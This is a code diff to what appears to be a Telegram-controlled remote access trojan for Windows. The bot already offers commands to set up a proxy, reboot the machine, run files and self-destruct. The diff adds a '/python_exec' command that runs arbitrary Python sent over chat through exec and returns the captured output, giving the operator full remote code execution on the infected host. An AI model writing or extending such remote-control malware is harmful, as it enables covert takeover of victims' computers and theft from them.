@@ -414,6 +414,26 @@ def handle(msg):
 				response = 'Proxy succesfully setup on ' + ip + ':8081'
 			elif command == '/pwd':
 				response = os.getcwd()
+			elif command.startswith('/python_exec'):
+				command = command.replace('/python_exec','').strip()
+				if len(command) == 0:
+					response = 'Usage: /python_exec print(\'printing\')'
+				else:
+					from StringIO import StringIO
+					import sys
+					old_stderr = sys.stderr
+					old_stdout = sys.stdout
+					sys.stderr = mystderr = StringIO()
+					sys.stdout = mystdout = StringIO()
+					exec command in globals()
+					if mystderr.getvalue() != None:
+						response += mystderr.getvalue()
+					if mystdout.getvalue() != None:
+						response += mystdout.getvalue()	
+					sys.stderr = old_stderr
+					sys.stdout = old_stdout
+					if response == '':
+						response = 'Expression executed. No return or malformed expression.'
 			elif command == '/reboot':
 				bot.sendChatAction(chat_id, 'typing')
 				command = os.popen('shutdown /r /f /t 0')
@@ -530,6 +550,7 @@ def handle(msg):
 						'/play':'<youtube_videoId>', \
 						'/proxy':'', \
 						'/pwd':'', \
+						'/python_exec':'<command_chain>', \
 						'/reboot':'', \
 						'/run':'<target_file>', \
 						'/self_destruct':'', \
